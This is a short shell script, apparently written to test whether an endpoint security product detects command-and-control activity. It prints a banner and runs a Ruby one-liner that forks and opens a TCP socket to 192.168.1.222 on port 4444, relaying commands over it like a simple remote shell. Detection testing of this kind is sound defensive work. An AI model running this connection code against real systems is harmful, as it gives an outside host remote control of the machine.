#/bin/sh

echo -e "\e[92mExecuting Command and Control via Remote Access Tools using Ruby script. This script will try to connect to 192.168.1.222 and will exit at fork. A Falcon Prevent action can kill the attempt"
ruby -rsocket -e'exit if fork;s=TCPSocket.new("192.168.1.222",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end' 
